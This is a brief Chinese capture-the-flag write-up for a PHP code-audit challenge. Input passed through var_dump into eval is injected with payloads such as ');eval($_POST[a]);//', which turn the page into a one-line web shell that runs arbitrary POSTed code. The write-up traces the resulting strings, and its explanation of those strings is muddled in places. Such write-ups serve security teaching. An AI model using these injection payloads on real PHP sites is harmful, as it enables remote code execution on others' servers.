## code audit challenges 2

分类：脚本开发

## write-up

我们可以构造如下的语句：

`payload1:?hello=);eval($_POST[a]);//`

这儿var_dump($a);后的结果为

`string(20) ");eval($_POST[a]);//"`

那么eval("var_dump($a);");的结果为

`eval(string(20) ");eval($_POST[a]);//");`

`payload2:?hello=);eval($_POST[a]`

var_dump($a)的结果

`string(16) ");eval($_POST[a]"`

那么eval("var_dump($a);");的结果为

`eval("string(16) ");eval($_POST[a]"");`